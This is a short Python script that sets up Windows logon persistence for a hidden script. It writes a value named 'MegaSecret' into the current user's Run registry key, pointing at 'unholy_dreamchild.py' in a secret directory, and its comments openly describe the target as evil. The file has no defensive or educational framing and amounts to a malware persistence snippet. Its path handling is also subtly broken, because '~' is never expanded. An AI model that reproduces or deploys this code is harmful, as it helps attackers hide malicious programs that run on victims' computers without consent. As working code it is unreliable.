import winreg
import os

# Get the full path of bad boy script
evil_path = os.path.abspath('~/.secret_dir/unholy_dreamchild.py')

#  create a Registry key under the HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run path.
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                     r'Software\Microsoft\Windows\CurrentVersion\Run',
                     0, winreg.KEY_SET_VALUE)

# Add script to registry key, name it,  rock n roll
winreg.SetValueEx(key, 'MegaSecret', 0, winreg.REG_SZ, evil_path)

# goodbye!
winreg.CloseKey(key)
